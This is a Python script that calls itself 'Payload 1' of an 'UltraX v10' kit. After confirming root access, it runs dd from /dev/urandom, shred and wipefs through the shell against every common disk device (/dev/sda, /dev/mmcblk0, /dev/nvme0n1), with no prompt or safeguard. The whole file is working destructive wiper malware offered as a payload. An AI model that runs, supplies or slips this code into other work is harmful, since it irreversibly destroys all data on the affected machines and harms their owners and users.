#!/usr/bin/env python3
# UltraX v10 - Payload 1: Filesystem Wipe + Killzone Format

import os
import time
import random
import subprocess

WIPE_TARGETS = ["/dev/sda", "/dev/mmcblk0", "/dev/nvme0n1"]
WIPE_METHODS = [
    "dd if=/dev/urandom of={target} bs=1M status=progress",
    "shred -vzn 3 {target}",
    "wipefs -a {target}"
]

def is_root():
    return os.geteuid() == 0

def wipe_device(device):
    print(f"[!!] Engaging wipe on: {device}")
    for method in WIPE_METHODS:
        cmd = method.format(target=device)
        try:
            print(f"[~] Executing: {cmd}")
            subprocess.run(cmd, shell=True, check=True)
            time.sleep(0.5)
        except Exception as e:
            print(f"[x] Failed method on {device}: {e}")

def burn_filesystems():
    for device in WIPE_TARGETS:
        wipe_device(device)

    print("[✓] Filesystems shredded, burned, and salted.")

if __name__ == "__main__":
    if not is_root():
        print("[-] Must be run as root.")
        exit(1337)

    print("[*] Payload Initialized: wipefs")
    burn_filesystems()
